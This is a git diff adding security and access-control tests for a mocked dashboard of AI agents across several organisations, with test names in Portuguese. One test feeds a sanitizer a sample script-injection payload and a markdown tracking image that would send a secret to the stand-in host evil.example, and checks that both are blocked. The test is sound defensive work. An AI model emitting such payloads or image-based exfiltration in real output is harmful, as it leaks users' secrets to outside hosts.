@@ -1,6 +1,17 @@
 import assert from "node:assert/strict";
 import { describe, test } from "node:test";
 import {
+  generateOrganizationUsageCsv,
+  MOCK_SESSION_ACTORS,
+  resolvePlatformBackoffice,
+  resolveTenantRouteAccess,
+} from "../lib/mock-enterprise-data.ts";
+import {
+  createIdempotencyKey,
+  registerIdempotentMutation,
+  sanitizeAgentMessageContent,
+} from "../lib/mock-security.ts";
+import {
   computeBudgetStatus,
   deriveDashboardViewModel,
   getMockOrganizationBySlug,
@@ -8,7 +19,7 @@ import {
   roleCanDecideApprovals,
 } from "../lib/mock-selectors.ts";
 
-describe("LOC-WEB-001 — Modelo e transformações do frontend mockado", () => {
+describe("LOC-WEB-001 — Modelo e transformações do frontend mockado (EP-10 sem 3D)", () => {
   test("WEB-MOCK-AC-01: expõe organizações mockadas e banner explícito de demonstração", () => {
     const orgs = listMockOrganizations();
     assert.equal(orgs.length, 2);
@@ -46,7 +57,7 @@ describe("LOC-WEB-001 — Modelo e transformações do frontend mockado", () => 
     assert.equal(vm.metrics.totalBudget.percentage, 73);
   });
 
-  test("WEB-MOCK-AC-03: ordena andares do topo ao térreo e filtra agentes por andar e busca", () => {
+  test("WEB-MOCK-AC-03: ordena departamentos e filtra agentes por departamento e busca", () => {
     const vm = deriveDashboardViewModel({ orgSlug: "aurora-industrial" });
     assert.deepEqual(
       vm.floors.map((f) => f.floorNumber),
@@ -104,5 +115,83 @@ describe("LOC-WEB-001 — Modelo e transformações do frontend mockado", () => 
 
     const fallbackOrg = getMockOrganizationBySlug("slug-inexistente");
     assert.equal(fallbackOrg.slug, "aurora-industrial");
+  });
+
+  test("WEB-001 (mock): acessar /orgs/<slug-de-B> não pertencente à sessão retorna 404 sem vazar dados", () => {
+    const marina = MOCK_SESSION_ACTORS[0] ?? null;
+    const allowedRes = resolveTenantRouteAccess(marina, "aurora-industrial");
+    assert.equal(allowedRes.allowed, true);
+    assert.equal(allowedRes.httpStatus, 200);
+    assert.equal(allowedRes.organization?.slug, "aurora-industrial");
+
+    const forbiddenCrossTenant = resolveTenantRouteAccess(marina, "titan-defesa");
+    assert.equal(forbiddenCrossTenant.allowed, false);
+    assert.equal(forbiddenCrossTenant.httpStatus, 404);
+    assert.equal(forbiddenCrossTenant.organization, null);
+
+    const unauthRes = resolveTenantRouteAccess(null, "aurora-industrial");
+    assert.equal(unauthRes.allowed, false);
+    assert.equal(unauthRes.httpStatus, 401);
+  });
+
+  test("WEB-002 (mock): idempotency key bloqueia mutação repetida (duplo clique)", () => {
+    const key = createIdempotencyKey("agt-fin-01", "lote-442", "approve");
+    assert.equal(key, "idem-agt-fin-01:lote-442:approve");
+
+    const firstAttempt = registerIdempotentMutation([], "agt-fin-01", "lote-442", "approve");
+    assert.equal(firstAttempt.allowed, true);
+
+    const secondAttempt = registerIdempotentMutation(
+      firstAttempt.updatedKeys,
+      "agt-fin-01",
+      "lote-442",
+      "approve",
+    );
+    assert.equal(secondAttempt.allowed, false);
+    assert.equal(secondAttempt.idempotencyKey, firstAttempt.idempotencyKey);
+  });
+
+  test("WEB-003 (mock): exporta CSV de consumo consistente com token_usage das fixtures", () => {
+    const csv = generateOrganizationUsageCsv("aurora-industrial");
+    assert.match(
+      csv,
+      /^organizacao,departamento,modulo,agente,modelo,tokens_usados_mes,tokens_limite_mes,gasto_mensal_brl,orcamento_mensal_brl/m,
+    );
+    assert.match(
+      csv,
+      /"aurora-industrial","Finanças & Controladoria","MOD-FIN-CORE","Helena \(Conciliação\)"/,
+    );
+  });
+
+  test("WEB-008 (mock): sanitiza payload XSS e bloqueia imagem remota automática em resposta de agente", () => {
+    const malicious =
+      "Parecer pronto.\n<script>alert('xss')</script>\n![tracker](https://evil.example/track.png?secret=1)";
+    const result = sanitizeAgentMessageContent(malicious);
+
+    assert.equal(result.blockedXssCount, 2);
+    assert.deepEqual(result.blockedRemoteImages, ["https://evil.example/track.png?secret=1"]);
+    assert.ok(
+      result.safeSegments.some((s) => s.kind === "blocked_xss"),
+      "Deve marcar o segmento XSS como bloqueado",
+    );
+    assert.ok(
+      result.safeSegments.some((s) => s.kind === "blocked_remote_image"),
+      "Deve reter imagem remota em placeholder sem carregá-la",
+    );
+  });
+
+  test("WEB-009 (mock): usuário comum de tenant recebe 403 em /platform e platform_admin vê apenas metadados", () => {
+    const tenantUser = MOCK_SESSION_ACTORS[0] ?? null;
+    const denied = resolvePlatformBackoffice(tenantUser);
+    assert.equal(denied.allowed, false);
+    assert.equal(denied.httpStatus, 403);
+    assert.equal(denied.tenants.length, 0);
+
+    const platformAdmin = MOCK_SESSION_ACTORS[2] ?? null;
+    const granted = resolvePlatformBackoffice(platformAdmin);
+    assert.equal(granted.allowed, true);
+    assert.equal(granted.httpStatus, 200);
+    assert.equal(granted.tenants.length, 5);
+    assert.equal(granted.dlqItems.length, 2);
   });
 });
